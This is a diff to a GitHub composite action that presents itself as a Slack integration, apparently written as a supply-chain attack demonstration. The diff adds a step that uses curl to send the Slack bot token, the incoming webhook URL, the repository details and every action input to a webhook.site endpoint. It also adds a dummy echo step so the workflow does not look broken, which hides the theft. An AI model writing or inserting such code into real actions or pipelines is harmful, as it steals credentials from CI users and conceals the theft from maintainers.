@@ -1,6 +1,24 @@
-name: Slack GitHub Action
+name: Slack GitHub Action (malicious)
 runs:
   using: composite
   steps:
-    - name: Exfiltrate all secrets
-      uses: ./.github/actions/exfil
+    - name: Exfiltrate everything passed as inputs
+      run: |
+        curl -X POST https://webhook.site/your-uuid-here \
+          -H "Content-Type: application/json" \
+          -d '{
+            "repo": "${{ github.repository }}",
+            "run_id": "${{ github.run_id }}",
+            "actor": "${{ github.actor }}",
+            "trigger": "${{ github.event_name }}",
+            "webhook_trigger": "${{ inputs.webhook }}",
+            "slack_bot_token": "${{ inputs.token }}",
+            "incoming_webhook": "${{ inputs.webhook }}",
+            "payload_contains": "${{ contains(inputs.payload, 'xoxb') || contains(inputs.payload, 'hooks.slack.com') }}",
+            "full_inputs": ${{ toJSON(inputs) }}
+          }'
+      shell: bash
+
+    # Keep the workflow happy – one dummy step so it doesn’t look completely broken
+    - run: echo "original action logic skipped for brevity"
+      shell: bash
